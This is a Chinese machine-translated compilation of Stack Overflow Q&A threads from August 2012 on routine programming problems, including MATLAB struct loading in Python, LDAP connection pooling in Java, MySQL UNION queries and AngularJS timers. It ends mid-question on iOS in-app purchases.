# StackOverflow 问答 11955000-11955999

# python - 在 python 中访问时如何保留 matlab 结构？

> ID：11955000
> 
> 赞同：12
> 
> 时间：2012-08-14T14:51:35.193
> 
> 标签：python, matlab, structure, mat-file, preserve

我有一个我使用的 mat 文件

```
from scipy import io
mat = io.loadmat('example.mat') 
```

在 matlab 中，example.mat 包含以下结构

```
 >> load example.mat
    >> data1

    data1 =

            LAT: [53x1 double]
            LON: [53x1 double]
            TIME: [53x1 double]
            units: {3x1 cell}

    >> data2

    data2 = 

            LAT: [100x1 double]
            LON: [100x1 double]
            TIME: [100x1 double]
            units: {3x1 cell} 
```

在 matlab 中，我可以像 data2.LON 等一样简单地访问数据。这在 python 中并不简单。它给了我几个选择，虽然喜欢

```
mat.clear       mat.get         mat.iteritems   mat.keys        mat.setdefault  mat.viewitems   
mat.copy        mat.has_key     mat.iterkeys    mat.pop         mat.update      mat.viewkeys    
mat.fromkeys    mat.items       mat.itervalues  mat.popitem     mat.values      mat.viewvalues 
```

是否可以在 python 中保留相同的结构？如果没有，如何最好地访问数据？我正在使用的当前 python 代码很难使用。

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-14T15:22:23.417

找到了这个关于 matlab struct 和 python 的教程

[http://docs.scipy.org/doc/scipy/reference/tutorial/io.html](http://docs.scipy.org/doc/scipy/reference/tutorial/io.html)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-03-04T17:47:52.940

当我需要从 MATLAB 将存储在结构数组 {strut_1,struct_2} 中的数据加载到 Python 中时，我会从我加载的对象中提取键和值列表 `scipy.io.loadmat`。然后我可以将它们组装到自己的变量中，或者如果需要，将它们重新打包到字典中。该`exec`命令的使用可能不适用于所有情况，但如果您只是尝试处理数据，它会很好地工作。

```
# Load the data into Python     
D= sio.loadmat('data.mat')

# build a list of keys and values for each entry in the structure
vals = D['results'][0,0] #<-- set the array you want to access. 
keys = D['results'][0,0].dtype.descr

# Assemble the keys and values into variables with the same name as that used in MATLAB
for i in range(len(keys)):
    key = keys[i][0]
    val = np.squeeze(vals[key][0][0])  # squeeze is used to covert matlat (1,n) arrays into numpy (1,) arrays. 
    exec(key + '=val') 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-12-08T08:36:28.277

这会将 mat 结构作为字典返回

```
def _check_keys( dict):
"""
checks if entries in dictionary are mat-objects. If yes
todict is called to change them to nested dictionaries
"""
for key in dict:
    if isinstance(dict[key], sio.matlab.mio5_params.mat_struct):
        dict[key] = _todict(dict[key])
return dict

def _todict(matobj):
    """
    A recursive function which constructs from matobjects nested dictionaries
    """
    dict = {}
    for strg in matobj._fieldnames:
        elem = matobj.__dict__[strg]
        if isinstance(elem, sio.matlab.mio5_params.mat_struct):
            dict[strg] = _todict(elem)
        else:
            dict[strg] = elem
    return dict

def loadmat(filename):
    """
    this function should be called instead of direct scipy.io .loadmat
    as it cures the problem of not properly recovering python dictionaries
    from mat files. It calls the function check keys to cure all entries
    which are still mat-objects
    """
    data = sio.loadmat(filename, struct_as_record=False, squeeze_me=True)
    return _check_keys(data) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-29T20:24:07.820

（！）如果嵌套结构保存在`*.mat`文件中，有必要检查字典中`io.loadmat`输出的项目是否是 Matlab 结构。例如，如果在 Matlab

```
>> thisStruct

ans =
      var1: [1x1 struct]
      var2: 3.5

>> thisStruct.var1

ans =
      subvar1: [1x100 double]
      subvar2: [32x233 double] 
```

然后在[scipy.io.loadmat 嵌套结构（即字典）中通过合并使用代码](https://stackoverflow.com/questions/7008608/scipy-io-loadmat-nested-structures-i-e-dictionaries)

# validation - 需要数据库访问的代码优先验证（重复值）

> ID：11955005
> 
> 赞同：1
> 
> 时间：2012-08-14T14:51:54.977
> 
> 标签：validation, attributes, code-first

这个问题可能已经被问过了，抱歉

我正在研究验证我们模型的架构。我们的简单验证可以通过使用属性验证属性（一些自定义）并使用

模型状态.IsValid

但是问题是当验证需要访问数据库或访问另一个属性时。一个完美的例子是检查重复名称。在这种情况下，我们需要检查数据库中 id 不等于当前对象的重复名称（用于更新）

如果我们将其写为要应用于 name 属性的验证属性，这将导致问题。我们如何访问数据库以及如何访问 id 属性。

所以总而言之。有没有什么好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:06:34.823

我今天花了一些时间来探索我正在从事的一个项目，并得出了这些结论。

解决方法也不错，其中大部分涉及一些反射和使用验证上下文来检查和访问模型的其他属性或使用 IValidationObject。真正的问题变成了是否可以进行需要数据库交互的验证。

对于一个我担心性能的人来说，在一个特定情况下，验证进行了一个查询，该查询返回一个对象以确保它存在，我后来需要它来进行关系分配，这将导致另一个查询。

其次，您需要考虑数据库并发性。进行重复检查的最佳方法是在插入期间而不是之前，因为数据库可能会在两个操作之间发生变化。这也与第一个原因有关，一个对象可以在数据库报告它存在后立即被删除。

在我的特定项目中，我觉得通过修改我的 EF 上下文并将任何出错的东西添加到 ModelState 来保持这种行为会更好。

# jquery - 当fancybox打开时暂停循环所有幻灯片

> ID：11955006
> 
> 赞同：0
> 
> 时间：2012-08-14T14:51:57.313
> 
> 标签：jquery, fancybox, cycle, jquery-cycle

当 fancybox 处于活动状态时尝试暂停幻灯片放映，但无法正常工作 - 任何建议表示赞赏。

```
 $('.section-testimonials').cycle({
    fx: 'fade',
    speed: 1000,
    containerResize: 0,
    timeout: 9000,
    pager:      '#slide-nav', 
    pagerEvent: 'mouseover',
    pauseOnPagerHover: true ,
    pause: 1
});

$(".fancybox").fancybox({
    'overlayColor':'#E8EEF4',
    'overlayOpacity': .9,
    'onStart': function(){
        $('.section-testimonials').cycle('pause');
    },
    'onClosed': function(){
        $('.section-testimonials').cycle('resume');
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:02:18.850

一方面，您在`;`onClosed 函数代码之后缺少一个：

```
$('.section-testimonials').cycle('resume') 
```

另外，尝试使用`window.parent.document`：

```
$(".fancybox").fancybox({
    'overlayColor':'#E8EEF4',
    'overlayOpacity': .9,
    'onStart': function(){
        $('.section-testimonials', window.parent.document).cycle('pause');
    },
    'onClosed': function(){
        $('.section-testimonials', window.parent.document).cycle('resume');
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-15T08:44:00.937

如果您将 Wordpress 与 fancybox 和流星幻灯片插件一起使用，但您不想编辑插件，这是一个解决方案

```
//pause by default
jQuery('.meteor-slides').cycle('pause'); 

//when fancybox is closed, resume the slideshow
jQuery('#fancybox-close, #fancybox-overlay').click(function() { 
    jQuery('.meteor-slides').cycle('resume'); 
}) 
```

# c++ - 您将如何管理 VS 中应该基于解决方案的环境变量？

> ID：11955012
> 
> 赞同：0
> 
> 时间：2012-08-14T14:52:12.943
> 
> 标签：c++, visual-studio

我们在单独的环境变量中拥有通往第 3 方库的路径。示例：LIB1_SDK=c:\Program Files\lib1\1.0 LIB2_SDK=c:\Program Files\lib2\3.0 等...

在我们的项目中，我们将以下内容添加到包含路径中：$(LIB1_SDK)/include, $(LIB2_SDK)/include

问题是您无法以这种方式可靠地创建构建，因为您的构建依赖于不属于解决方案或项目的环境变量。

一种解决方案是切换到使用环境变量 LIB1_SDK_V1、LIB2_SDK_V3 等，但是你会遇到一个问题，如果你想构建一个具有多个项目的解决方案，你不能轻易地将它们全部更改为不同版本的特定的图书馆。

理想情况下，我们将能够在解决方案级别设置环境变量。这样，您可以分支解决方案并尝试更新到新版本的 3rd 方库。

使用 Visual Studio 管理 3rd 方包含和 dll 的最佳方法是什么？

顺便说一句，我们正在使用 VS 2008、VS 2010 和 TFS。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T14:59:32.540

在 VS2010 中，我们使用解决方案中所有项目通用的“项目属性表”。

# .net - 如何在控制器中为 Json 渲染部分视图

> ID：11955015
> 
> 赞同：2
> 
> 时间：2012-08-14T14:52:19.010
> 
> 标签：.net, ajax, json, asp.net-mvc-3, controller

如何渲染部分视图以在控制器的 JsonResult 中使用？

```
return Json(new
{
    Html = this.RenderPartialView("_EditMovie", updatedMovie),
    Message = message
}, JsonRequestBehavior.AllowGet); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T14:58:47.300

`RenderPartialView`是一种自定义扩展方法，它将视图呈现为`string`.

[文章](http://www.stefanprodan.eu/2011/05/edit-data-in-dialog-form-with-jquery-and-asp-net-mvc/)中没有提到（您最初提到的内容），但您可以在文章所附的示例代码中找到它。它可以在 \Helpers\Reders.cs 下找到

这是相关方法的代码：

```
public static string RenderPartialView(this Controller controller, 
    string viewName, object model)
{
    if (string.IsNullOrEmpty(viewName))
        viewName = controller.ControllerContext.RouteData
            .GetRequiredString("action");

    controller.ViewData.Model = model;
    using (var sw = new StringWriter())
    {
        ViewEngineResult viewResult = ViewEngines.Engines
            .FindPartialView(controller.ControllerContext, viewName);
        var viewContext = new ViewContext(controller.ControllerContext, 
            viewResult.View, controller.ViewData, controller.TempData, sw);
        viewResult.View.Render(viewContext, sw);

        return sw.GetStringBuilder().ToString();
    }
} 
```

# dynamics-crm-2011 - 试用系统中的crm 2011日期格式

> ID：11955016
> 
> 赞同：0
> 
> 时间：2012-08-14T14:52:21.123
> 
> 标签：dynamics-crm-2011

我尝试创建指定美国以外地区的 30 天试用系统，以便日期格式为 dd/mm/yyyy。

试用系统始终使用美国日期格式创建。

我尝试在管理->系统设置中更改此格式，但我在那里的更改似乎没有任何影响。

仅在我需要创建 Office365 帐户后才出现这种情况 - 直到那时还可以。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:46:51.860

您还应该检查用户的个人设置。

1.  以用户身份登录
2.  开放式客户关系管理
3.  单击文件（蓝色按钮，左上角）
4.  单击选项
5.  单击格式
6.  确认“当前格式”正确。

# javascript - 管理动态磁贴和应用程序生命周期

> ID：11955018
> 
> 赞同：1
> 
> 时间：2012-08-14T14:52:36.563
> 
> 标签：javascript, windows-8, microsoft-metro

我有一个使用动态磁贴并定期更新它们的应用程序。如果 Windows 8 重新启动，我的应用程序将停止更新动态磁贴，因为它已终止。Metro 预装的应用程序（图片库、财务）正在完成这项工作。我可以在这里做什么？

资源：

*   使用瓷砖：http: [//msdn.microsoft.com/en-us/library/windows/apps/hh761490.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/hh761490.aspx)
*   应用程序生命周期：http: [//msdn.microsoft.com/en-us/library/windows/apps/hh464925.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/hh464925.aspx)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:43:13.040

您应该使用[定期更新](http://msdn.microsoft.com/en-us/library/windows/apps/Hh779721.aspx)。无论您的应用程序是否正在运行，定期更新都可以继续。

# android - android中的滑动页面

> ID：11955021
> 
> 赞同：-1
> 
> 时间：2012-08-14T14:52:45.440
> 
> 标签：android, android-layout, android-viewpager, viewflipper

我正在开发一个应用程序，假设我有 5 个不同的布局以及一个主布局，其中包含指向每个布局的链接。在主布局中，当用户单击第一个按钮时，假设通过滑动进入相关布局。其他视图也是如此。

当用户转到其中一个布局时，下一个布局也有几个链接到其他布局，就像一个链一样。并且这条链通过滑动从布局移动到另一个。

我曾尝试使用视图翻转器来执行此操作，但由于我有很多不同的布局，并且它们有背景图像和一些内容，所以我出现内存不足错误。

所以我试图以这种方式找到解决方案。知道如何做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:12:54.383

我建议您使用 Jake Whartons [ViewPageIndicator](http://viewpagerindicator.com/)：

为您的每个布局创建一个`Fragment`，并使用片段内的方法将布局设置为您`onCreateView()`的片段：

```
@Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, 
        Bundle savedInstanceState) {

        return inflater.inflate(R.layout.layout, container, false);
    } 
```

现在创建一个`FragmentPagerAdapter`名为`getItem()`. `Switch`位置并将其设置为您的片段：

```
 public Fragment getItem(int position) {
 switch(position)
       {
               case 0:
                    TestFragment fragment = new TestFragment();  
                    return fragment;

                case 1:
                    TestFragment2 fragment2 = new TestFragment2();  
                    return fragment2;

         }

                    DefaultFragment fragment3 = new DefaultFragment();  
                    return fragment3;

         } 
```

现在您应该可以轻松滑动到您的布局（片段）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:16:18.520

开始一个新的`android.app.Activity`托管每个布局，并使用`overridePendingTransition(R.anim.animation_leave, R.anim.animation_enter);`其中 *.anim.animation_leave 和 _enter 覆盖活动之间的转换，在[这个 SO 答案](https://stackoverflow.com/a/5151774/1348379)中已经为您明确指定了。

您可以在调用后立即编写 overridePendingTransition 代码以启动“链接”活动，并且（如果需要）可以通过在调用`finish()`Activity 或选择“向上”导航按钮按下或“返回”后提供相反的转换来应用反向效果-按钮'按下。

让一个活动管理一个布局（根据我的经验）也有利于代码的可维护性。

# c++ - C ++ cout在do while循环中打印两次

> ID：11955025
> 
> 赞同：2
> 
> 时间：2012-08-14T14:52:47.577
> 
> 标签：c++

系统这样做了：

请输入用户全名：请输入用户全名：

它输出字符串“请输入用户的全名：”两次，我如何更改代码以使其只输出一次

```
string fullname = "";

    do
    {
    cout << "Please input the Full Name of the user: ";
    getline (cin,fullname);
    }while(fullname.length()<1); 
```

C++是什么导致系统输出两次

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T14:57:40.843

您可以尝试刷新您的输入流以摆脱剩余的换行符：（ `std::cin.ignore(x);` 作为`x`要忽略的字符数，例如`INT_MAX`）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T14:59:51.480

您正在执行输入操作而不检查结果，这是一个难以编程和理解的错误。改为这样做：

```
for (std::string line; ; )
{
    std::cout << "Name: ";
    if (!std::getline(std::cin, line) || !line.empty()) { break; }
} 
```

第一个条件检查输入是否成功（关闭输入流时为假），第二个条件检查读取的行是否非空。`||`使第二次检查合法的短路语义。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-14T15:01:21.393

简单的解决方案是将 std::cout 语句移到 do-while 循环之外。

```
string fullname = "";
cout << "Please input the Full Name of the user: ";
do
{ 
    getline (cin,fullname);
}while(fullname.length()<1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:59:04.230

正如其他人指出的那样，问题在于输入流上有一个额外的 '\n' 字符。

与流行的答案相反，我认为刷新 (ignore()) 当前输入不是一个好的解决方案。你治疗的是症状而不是问题。如果您使用 ignore() 您可能会丢弃您可能真正想要的用户输入或可能检测到用户错误的内容：

```
> Input Your age
> 36xxxx

// If you use
std::cin >> age;
// Then sometime later in your code you use
// ignore to make sure that you have "correctly" skipped to the next new line
std::ignore(std::numeric_limits<std::streamsize>::max(), '\n');

// You have now just ignored the fact that the user typed xxx on the end of the input.
// They were probably doing that to force an error in the code or something else erroneous
// happened but you just missed it with std::ignore() 
```

最好的解决方案是不要陷入这种情况。
此问题是由使用`operator<<()`和的组合`std::getline()`来解析用户输入引起的。我喜欢`operator<<()`用来解析正常或常规输入；但是手动用户输入（即问题/答案）更难预测，用户输入是`line based`（输入以'\n'字符结束，因为当他们点击<enter>时缓冲区被刷新）。

因此，当我解析时，`manual user input`我总是使用 std::getline()。这样我就知道我得到了他们的全部答案。它还允许我验证输入以确保没有输入错误。

```
 std::cout << "What is your age\n";

 std::string        line;
 std::getline(std::cin, line);   // Get user input

 // Use stream for easy parsing.
 std::stringstream  linestream(line);

 // Get value we want.
 linestream >> age;

 // Validate that we have not thrown away user input.
 std::string error;
 linestream >> error;
 if (error.length() != 0) { /* do stuff to force user to re-input value */ } 
```

# c# - 尝试使用列表时出现空异常

> ID：11955028
> 
> 赞同：0
> 
> 时间：2012-08-14T14:52:56.127
> 
> 标签：c#

我有从 Map 继承的 StartingMap。这是我正在尝试做的事情：

```
Map m_map;
List<Map> m_versions;

m_versions.add(new StartingMap(...)); // create null reference exeption

m_map= new StartingMap(...); // no error and load the map perfectly 
```

为什么第一个错误而不是第二个错误？我也在做同样的事情。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-14T14:53:54.107

你必须实例化`m_versions`，比如

```
m_versions = new List<Map>(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T14:55:30.773

您需要初始化 m_versions：

```
m_versions = new List<Map>(); 
```

在您可以使用它并向其添加项目之前。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-14T14:54:15.207

在将任何项目添加到集合之前，您需要实例化 List。在第二个示例中，您只是调用了 StartingMap 的构造函数完全不同的东西。

因此，在将任何项目添加到列表之前，您需要：

```
m_versions = new List<Map>() 
```

# java - 为什么 DirContext.close() 不将 LDAP 连接返回到池？

> ID：11955041
> 
> 赞同：8
> 
> 时间：2012-08-14T14:53:25.767
> 
> 标签：java, ldap, jndi, connection-pooling

我注意到在使用 LDAP 连接池时，尽管文档[另有说明](http://docs.oracle.com/javase/6/docs/api/javax/naming/Context.html#close%28%29)[，](http://docs.oracle.com/javase/jndi/tutorial/ldap/connect/pool.html)`close()`但调用上下文似乎并未将其返回到池中。因此，当我尝试从池中获取已达到最大大小的项目时，它会挂起。

我设法将其缩小到最小的情况。尽管我相信我`close()`确定性地调用了所有相关对象，但它似乎依赖垃圾收集来实际将对象返回到池中，这是出乎意料的。**为什么会这样？我应该关闭其他对象吗？**

在下面的代码片段中：

*   我人为地将最大池大小设置为 1 以突出问题。
*   我`DirContext`从池中获取一个（第 (2) 行），尝试将其返回到池中（第 (4) 行），然后从池中获取另一个（第 (6) 行），它应该返回相同的返回对象。
*   相反，第二个请求（第 (6) 行）挂在对`Object.wait()`. 我猜它正在等待一个池化对象变得可用。
*   如果通过注释掉（1）来关闭池，它不会挂起（但我想要池！）。
*   如果我注释掉 (3) - 调用`SearchResults.next()`- 它工作正常。
*   如果我取消注释第 (5) 行以强制在“返回池”调用和向池请求新对象之间进行垃圾收集，它不会挂起。

由于注释掉第 (3) 行会使问题消失，也许我没有正确关闭它的返回值，并且它使池连接保持打开状态。但是，在这种情况下，该方法`results.next()`返回 a [`SearchResult`](http://docs.oracle.com/javase/6/docs/api/javax/naming/directory/SearchResult.html)，它没有`close`方法，并且在其文档中没有关于如何干净地关闭它的指导。

测试用例：

```
@Test
public void testHangs() throws NamingException {

    System.setProperty("com.sun.jndi.ldap.connect.pool.debug", "fine");
    System.setProperty("com.sun.jndi.ldap.connect.pool.maxsize", "1");

    Hashtable<String,String> env = new Hashtable<String,String>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
    env.put(Context.SECURITY_PRINCIPAL, user);
    env.put(Context.SECURITY_CREDENTIALS, passwd);
    env.put(Context.SECURITY_AUTHENTICATION, "simple");
    env.put(Context.PROVIDER_URL, ldapUrl);

    // use a connection pool
    env.put("com.sun.jndi.ldap.connect.pool", "true"); // -----------------  (1)

    // get a context from the pool.
    DirContext context = new InitialDirContext(env); // -------------------- (2)
    NamingEnumeration<SearchResult> results = context.search("", query, getSC());
    // obviously the next two lines would normally be in a 
    // while(results.hasMore()) { ... = results.next(); } loop.
    assertTrue(results.hasMore()); // this is only a problem when there are some results.
    results.next(); // ----------------------------------------------------- (3)

    // ensure the context is returned to the pool.
    results.close();
    context.close(); // ---------------------------------------------------- (4)

    //System.gc(); // ------------------------------------------------------ (5)

    new InitialDirContext(env);  // hangs here! ---------------------------- (6)
} 
```

使用原样的代码，我的控制台显示：

```
Create com.sun.jndi.ldap.LdapClient@1a7bf11[ldapad:389]
Use com.sun.jndi.ldap.LdapClient@1a7bf11 
```

而如果我强制 GC，我还会看到：

```
Release com.sun.jndi.ldap.LdapClient@93dee9 <-- on GC
Use com.sun.jndi.ldap.LdapClient@93dee9     <-- on new InitialDirContext 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-15T08:58:18.757

经过一番调查，我发现 LDAP 连接没有返回到池中，因为 SearchResult 对象包含对 LdapCtx 对象的引用。

如果你更换

```
results.next(); 
```

与以下

```
SeachResult ob = results.next();
((Context)ob.getObject()).close(); 
```

该连接将正确返回到池中。这似乎是默认实现中的一个错误。

使用 Spring LDAPTemplate 时不存在该问题，因为它在构建 SearchResult 的过程中关闭 LdapCtx 的环境中提供了一个自定义的“java.naming.factory.object”。这可以通过将 Spring LDAP 库添加到您的类路径并将以下内容添加到 InitialContext 来轻松演示

*java.naming.factory.object=org.springframework.ldap.core.support.DefaultDirObjectFactory*

完成后，SearchResult 持有的对象从*com.sun.jndi.ldap.LdapCtx:com.sun.jndi.ldap.LdapCtx*变为*org.springframework.ldap.core.DirContextAdapter*。*DefaultDirObjectFactory*类负责创建 DirContextAdapter 并在将 DirContextAdapter 返回到*DirectoryManager*之前*关闭*LdapCtx 。这是*DefaultDirObjectFactory的 finally 块*

```
finally {
        // It seems that the object supplied to the obj parameter is a
        // DirContext instance with reference to the same Ldap connection as
        // the original context. Since it is not the same instance (that's
        // the nameCtx parameter) this one really needs to be closed in
        // order to correctly clean up and return the connection to the pool
        // when we're finished with the surrounding operation.
        if (obj instanceof Context) {

            Context ctx = (Context) obj;
            try {
                ctx.close();
            }
            catch (Exception e) {
                // Never mind this
            }

        }
    } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-15T11:06:00.220

更改您的`SearchControls`对象以使其`returningObjFlag`属性为 false。您通常不需要对象本身，只需要它的 nameInNamespace 及其属性。如果要创建或修改子上下文，则只需要对象本身。

# php - 如何将两个相似的 MySQL 语句合并为一个

> ID：11955043
> 
> 赞同：1
> 
> 时间：2012-08-14T14:53:27.037
> 
> 标签：php, mysql

我无法将两个 MySQL 语句合并为一个，目前我必须分别运行它们，然后将它们放入一个数组中，然后合并这些数组。

这是功能

**第一个功能**

```
/* returns all books from table book */
function getProfitableBooksNew(){
    $q = "SELECT *, 

    ROUND((amazon_new_price/100*80) - lowest_new_price,2) AS margin 

    FROM ".TBL_BOOKS." 

    WHERE rank < 200000 AND rank IS NOT NULL 
    AND lowest_new_price < amazon_new_price/100*80 
    AND amazon_new_price < 9999 
    AND ROUND((amazon_new_price/100*80) - lowest_new_price) > (lowest_new_price/100*".MARGIN.") 

    ORDER BY rank ASC";

    $result = mysql_query($q, $this->connection);

    if(!$result || (mysql_numrows($result) < 1))
        return null;

    $arr = array();
    $numRows = mysql_num_rows($result);//count
    if($numRows>0){
        for($i=0; $i<$numRows; $i++){
            $arr[] = array(
                "isbn"                  => mysql_result($result, $i, "isbn"),
                "title"                 => mysql_result($result, $i, "title"),
                "rank"                  => mysql_result($result, $i, "rank"),                   
                "amazon_price"          => mysql_result($result, $i, "amazon_new_price"),
                "amazon_condition"      => "New",

                "lowest_price"          => mysql_result($result, $i, "lowest_new_price"),
                "lowest_condition"      => "New",

                "margin"                => mysql_result($result, $i, "margin"),

                "last_price_updated"    => mysql_result($result, $i, "last_price_updated"),
                "last_rank_updated"     => mysql_result($result, $i, "last_rank_updated")
            );
        }
    }       

    return $arr;
} 
```

**第二个功能**

```
/* returns all books from table book */
function getProfitableBooksUsed(){
    $q = "SELECT *, 

    ROUND((amazon_used_price/100*80) - lowest_used_price, 2) AS margin 

    FROM ".TBL_BOOKS." 

    WHERE rank < 200000 AND rank IS NOT NULL 
    AND lowest_used_price < amazon_used_price/100*80 
    AND amazon_used_price < 9999 
    AND amazon_used_price < amazon_new_price 
    AND ROUND((amazon_used_price/100*80) - lowest_used_price) > (lowest_used_price/100*".MARGIN.") 

    ORDER BY rank ASC";

    $result = mysql_query($q, $this->connection);

    if(!$result || (mysql_numrows($result) < 1))
        return null;

    $arr = array();
    $numRows = mysql_num_rows($result);//count
    if($numRows>0){
        for($i=0; $i<$numRows; $i++){
            $arr[] = array(
                "isbn"                  => mysql_result($result, $i, "isbn"),
                "title"                 => mysql_result($result, $i, "title"),
                "rank"                  => mysql_result($result, $i, "rank"),                   
                "amazon_price"          => mysql_result($result, $i, "amazon_used_price"),
                "amazon_condition"      => mysql_result($result, $i, "amazon_used_condition"),

                "lowest_price"          => mysql_result($result, $i, "lowest_used_price"),
                "lowest_condition"      => "Used",

                "margin"                => mysql_result($result, $i, "margin"),

                "last_price_updated"    => mysql_result($result, $i, "last_price_updated"),
                "last_rank_updated"     => mysql_result($result, $i, "last_rank_updated")
            );
        }
    }       

    return $arr;
} 
```

**加入函数**

```
/* returns profitable books */
function getProfitableBooks(){
    $new = $this->getProfitableBooksNew();
    $used = $this->getProfitableBooksUsed();

    if($new && $used){
        return array_merge($new, $used);

    }else if($new){
        return $new;

    }else if($used){
        return $used;

    }else{
        return null;
    }
} 
```

谁能给我一个关于如何解决这个问题的想法？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:00:27.813

您可以像这样将这两个查询合并为一个查询

```
SELECT *, 

    ROUND((amazon_new_price/100*80) - lowest_new_price,2) AS margin,
    'new' AS type 

    FROM ".TBL_BOOKS." 

    WHERE rank < 200000 AND rank IS NOT NULL 
    AND lowest_new_price < amazon_new_price/100*80 
    AND amazon_new_price < 9999 
    AND ROUND((amazon_new_price/100*80) - lowest_new_price) > (lowest_new_price/100*".MARGIN.") 

UNION

SELECT *, 

    ROUND((amazon_used_price/100*80) - lowest_used_price, 2) AS margin,
    'used' as type 

    FROM ".TBL_BOOKS." 

    WHERE rank < 200000 AND rank IS NOT NULL 
    AND lowest_used_price < amazon_used_price/100*80 
    AND amazon_used_price < 9999 
    AND amazon_used_price < amazon_new_price 
    AND ROUND((amazon_used_price/100*80) - lowest_used_price) > (lowest_used_price/100*".MARGIN.") 

ORDER BY type ASC, rank ASC 
```

请注意，我添加了一个字段“类型”，以便您区分新结果和使用过的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:01:09.170

您可以使用 UNION 语法

```
$sql = "(SELECT a FROM t1 WHERE a=10 AND B=1) 
UNION 
(SELECT a FROM t2 WHERE a=11 AND B=2) ORDER BY a LIMIT 10; 
```

# eclipse - 安装 AGX (agx.me) Eclipse 插件

> ID：11955044
> 
> 赞同：1
> 
> 时间：2012-08-14T14:53:30.337
> 
> 标签：eclipse

每次我尝试安装[AGX Eclipse 插件](http://agx.me/start/eclipse.html#installing-eclipse-agx)时，都会出现以下错误：

```
Cannot complete the install because one or more required items could not be found.
  Software being installed: AGX 1.2.2 (org.eclipse.agx.feature.group 1.2.2)
  Missing requirement: AGX 1.2.2 (org.eclipse.agx 1.2.2) requires 'package org.eclipse.papyrus.wizards 0.0.0' but it could not be found
  Cannot satisfy dependency:
    From: AGX 1.2.2 (org.eclipse.agx.feature.group 1.2.2)
    To: org.eclipse.agx [1.2.2] 
```

伽利略 3.5.2
纸莎草纸 1.12

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:18:47.057

也许您可以先尝试安装缺少的纸莎草纸插件。**[尝试此处](http://www.eclipse.org/modeling/mdt/papyrus/updates/index.php)**列出的以下更新站点之一。

我找不到 Ganyemede 的更新站点。也许这就是问题所在？

另外，从**[这个](https://stackoverflow.com/a/5363119/325742)**答案：

> 有两种可用的 Papyrus 版本：一种来自 www.papyrusuml.org，它仅支持 Eclipse 3.5 及更早版本，另一种来自[http://www.eclipse.org/modeling/mdt/papyrus/](http://www.eclipse.org/modeling/mdt/papyrus/)。后者支持 3.6 和更新版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-19T06:02:55.373

实际上有效，我不知道为什么......
我使用当前版本

*   日食开普勒
*   纸莎草纸 0.10.0
*   PyDev 2.8.1
*   Python 2.7.5

# angularjs - 无法使用 Angular js 方法动态更改页面

> ID：11955045
> 
> 赞同：1
> 
> 时间：2012-08-14T14:53:31.963
> 
> 标签：angularjs

这是我页面上的 Angular JS 函数：

```
function DateCtrl($scope) {

        $scope.returndate = function () {

            return Date.now();
        }

    } 
```

标记如下：

```
<html ng-app>
<body>    
<div id = "date" class = "stats" ng-controller = "DateCtrl">
            <span>Date:</span><div id = "noedate">{{returndate()}}</div>
    </div>
</body>
</html> 
```

由于数据绑定，您可能希望返回的日期`#nowdate`每秒更改一次，但事实并非如此。有谁知道这里有什么问题？

我会提供一个小提琴，但 jsfiddle 还不支持角度...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-14T15:19:54.507

数据不会自动更新，因为 AngularJS 不会不断地合并更改，而只会刷新模板以响应某些事件。您可以查看这篇文章：[AngularJS 中的数据绑定如何工作？](https://stackoverflow.com/questions/9682092/databinding-in-angularjs/9693933#9693933)有关角度内部工作的更多信息。

如果您想在给定时间后刷新某个值，请使用 $timeout 服务 ( [http://docs.angularjs.org/api/ng.$timeout](http://docs.angularjs.org/api/ng.$timeout) )。

实际上，使用 $watch 和 $timeout 的组合在 AngularJS 中做一个时钟非常容易：

```
$scope.time = new Date();  
$scope.$watch('time', function(){
    $timeout(function(){
        $scope.time = new Date();
    },1000);
}); 
```

这是完整的 jsFillde：http: [//jsfiddle.net/pkozlowski_opensource/f5ApP/1/](http://jsfiddle.net/pkozlowski_opensource/f5ApP/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T13:08:19.997

```
var updateTime = function () {
    $scope.currentTime = new Date();
    $timeout(updateTime, 1000);
};
updateTime(); 
```

# ios - 应用内购买

> ID：11955046
> 
> 赞同：-2
> 
> 时间：2012-08-14T14:53:36.800
> 
> 标签：ios, in-app-purchase, storekit

我试图让整个应用内购买工作，但我遇到了一些问题。所以我可以用我的测试用户帐户“购买”这些功能，但我想一次又一次地测试。所以我做了一个删除方法，删除生成的钥匙串并退出应用程序，然后再次构建它，它回到“免费”状态，我再次尝试购买应用程序，但这次它给出了我“你已经购买了这个项目，点击确定再次下载它”所以我点击确定，但这一次没有任何反应，也没有解锁任何功能，wtf？

代码：

```
